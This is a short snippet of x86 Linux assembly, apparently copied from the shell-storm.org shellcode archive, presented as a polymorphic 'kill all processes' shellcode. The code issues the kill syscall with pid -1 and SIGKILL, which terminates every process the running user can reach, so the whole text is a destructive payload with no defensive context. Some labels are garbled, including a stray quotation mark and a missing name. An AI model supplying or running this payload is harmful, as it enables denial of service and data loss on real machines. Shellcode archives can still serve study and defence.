
SHELLCODES taken from http://shell-storm.org: 

 

First polymorphic SHELLCODE version of , 

; Title: kill all processes for Linux/x86 11 bytes

; Original Author : By Kris Katter john 



section .text 

global _start 

_start"

xor eax , eax 

xor ebx , ebx 

sub ebx , 0x1

push BYTE 37

pop eax 

push BYTE 9

pop ecx 

int 0x80  
